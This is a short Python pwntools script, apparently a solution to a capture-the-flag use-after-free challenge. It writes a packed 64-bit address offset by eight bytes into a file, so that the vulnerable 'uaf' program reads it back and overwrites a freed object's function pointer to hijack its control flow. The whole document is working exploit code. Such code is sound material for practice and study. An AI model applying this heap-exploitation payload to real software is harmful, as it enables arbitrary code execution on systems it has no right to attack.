from pwn import *
#context.log_level = 'debug'
#
#bin = ELF('uaf')
#
#cn = process('./uaf')

fd = open('something','wb')
fd.write(p64(0x401550-8))
fd.close()